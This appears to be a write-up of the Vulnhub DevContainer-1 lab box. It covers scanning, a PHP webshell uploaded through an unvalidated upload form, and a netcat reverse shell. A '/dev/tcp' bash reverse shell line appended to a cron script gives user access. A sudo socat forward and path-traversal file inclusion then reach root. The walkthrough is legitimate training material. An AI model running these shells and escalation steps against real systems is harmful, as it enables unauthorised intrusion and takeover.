---
title: "Vulnhub: DevContainer-1"
layout: archive
date:   2020-10-24
tags: Vulnhub
tags_label: true
---
DevContainer-1 is an beginner-intermediate box from Vulnhub. It has a really cool privelege escalation step. 😀

### Scanning:

```
Nmap scan report for 192.168.56.123
Host is up (0.00017s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http
```

#### More Scanning:

```
crazyeights@es-base:~$ nmap -A -p- 192.168.56.123
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-24 13:03 EDT
Nmap scan report for 192.168.56.123
Host is up (0.000096s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Freelancer - Start Bootstrap Theme
```

### Web

![](/assets/images/dev/dc1.png)

### Web Enum:

```
crazyeights@es-base:~$ dirb http://192.168.56.123

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Oct 24 13:04:52 2020
URL_BASE: http://192.168.56.123/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.123/ ----
==> DIRECTORY: http://192.168.56.123/css/                                      
==> DIRECTORY: http://192.168.56.123/fonts/                                    
==> DIRECTORY: http://192.168.56.123/img/                                      
+ http://192.168.56.123/index.html (CODE:200|SIZE:27263)                       
==> DIRECTORY: http://192.168.56.123/js/                                       
+ http://192.168.56.123/license (CODE:200|SIZE:11336)                          
==> DIRECTORY: http://192.168.56.123/mail/                                     
+ http://192.168.56.123/server-status (CODE:403|SIZE:279)                      
==> DIRECTORY: http://192.168.56.123/upload/                                   
[SNIP]                                                                               
---- Entering directory: http://192.168.56.123/upload/files/ ----
                                                                               
-----------------
END_TIME: Sat Oct 24 13:05:02 2020
DOWNLOADED: 41508 - FOUND: 4
crazyeights@es-base:~$ 
```

### File Upload Dir:

![](/assets/images/dev/dc2.png)

Doesn't look like they every did file extension validation:

```
<title>In construction</title>
Allowed file types: jpg,gif,png,zip,txt,xls,doc
<!--I need to validate file extensions-->
```

### Testing the upload functionality:

To find the directory where the file gets uploaded to
![](/assets/images/dev/dc3.png)

File gets uploaded to:

```
http://192.168.56.123/upload/files/playing-card-icon-png-favpng-4y5r4Fw9K8A5vPjnaZyCfKsGN.jpg
```

**Testing uploading a php file:**

Using a webshell, because I am curious if it will work.

```
http://192.168.56.123/upload/files/caf7e7bf96a799f0547469cb698bfb68.php
```

### Neat:

![](/assets/images/dev/dc4.png)

**Now for proper reverse shell:**

*   Using pentest monkey php reverse shell

*   Start listener:

```
crazyeights@es-base:~$ nc -lvp 1234
listening on [any] 1234 ...
```

![](/assets/images/dev/dc5.png)

**www-data shell:**
```
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.123] 37218
Linux 06502074cfda 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux
 17:13:03 up 11 min,  0 users,  load average: 0.04, 0.13, 0.13
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

In Maintenance-Web-Docker in www/html:

```
130351 -rwxrwxrwx  1 root root  164 Sep 13 04:23 list.sh
130349 -rwxr-xr-x  1 root root  204 Sep 12 21:31 maintenance.sh
130341 -rw-r--r--  1 1000 1000  442 Oct 24 17:15 out.txt
```
We find this script which might be run using a cronjob:
```
$ cat list.sh
#!/bin/bash
date >> /home/richard/web/Maintenance-Web-Docker/out.txt
ls /home/richard/web/upload/files/ | wc -l >> /home/richard/web/Maintenance-Web-Docker/out.txt
```

The script is being run every minute, as can be seen by the output in out.txt:

```
$ cat out.txt
[SNIP]
Sat 24 Oct 2020 01:13:01 PM EDT
2
Sat 24 Oct 2020 01:14:01 PM EDT
3
```

**Trying to use the list script to get elevated privileges:**

Start a listener:

```
nc -lvp 9999
```

```
$ echo "/bin/bash -i >& /dev/tcp/192.168.56.1/9999 0>&1" >> list.sh
```

**Getting richard (user):**

```
crazyeights@es-base:~$ nc -lvp 9999
listening on [any] 9999 ...
192.168.56.123: inverse host lookup failed: Unknown host
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.123] 45626
bash: cannot set terminal process group (1166): Inappropriate ioctl for device
bash: no job control in this shell
richard@EC2:~$ ls
ls
HackTools
user.txt
web
richard@EC2:~$ cat user.txt
cat user.txt
3a6b99f59ea363803bcafc7f5dd9b1e8
richard@EC2:~$ 
```

**Checking out web:**

There is a copy(?) of the site in www/html:

```
richard@EC2:~$ cd web
cd web
richard@EC2:~/web$ ls
ls
css
font-awesome
fonts
img
index.html
js
less
license
mail
Maintenance-Web-Docker
readme.md
upload
```

**Checking out HackTools:**

```
richard@EC2:~$ cd HackTools	
cd HackTools
richard@EC2:~/HackTools$ ls
ls
README.txt
socat
richard@EC2:~/HackTools$ cat README.txt
cat README.txt
Richard, it's annoying to lose bash, try:
( sudo socat [...] ) &
```

As soon as I read `Richard, it's annoying to lose bash,`, i was like ohh noo what if I lose bash and have to start over...

**Checking if richard can run socat as root**

```
richard@EC2:~/HackTools$ sudo -l
sudo -l
Matching Defaults entries for richard on EC2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User richard may run the following commands on EC2:
    (ALL) NOPASSWD: /home/richard/HackTools/socat TCP-LISTEN\:8080\,fork
        TCP\:127.0.0.1\:90
```
He cannot but he can run something else

**Trying to run the command as user root:**

```
richard@EC2:~/HackTools$ sudo -u root /home/richard/HackTools/socat TCP-LISTEN\:8080\,fork TCP\:127.0.0.1\:90
```
We now have a webserver running as root, if we can execute commands, or read files through it then we can find a way to get root access.

You can now access the development site at localhost:8080:

![](/assets/images/dev/dc6.png)

**Looks like LFI:**

```
http://192.168.56.123:8080/index.php?view=about-us.html
```

**Let's see if I can find my nifty webshell to reuse:**

Since the maintenance script copies all uploads to richards web folder, reuse my shell with this process which is running as root.

```
http://192.168.56.123:8080/index.php?view=../../../../../../../../../home/richard/web/upload/files/caf7e7bf96a799f0547469cb698bfb68.php
```

### Neat:

![](/assets/images/dev/dc7.png)

**Checking /root:**

![](/assets/images/dev/dc8.png)

**Getting root flag:**

![](/assets/images/dev/dc9.png)

I could have gotten a real shell from here but I didn't 🤫

FIN.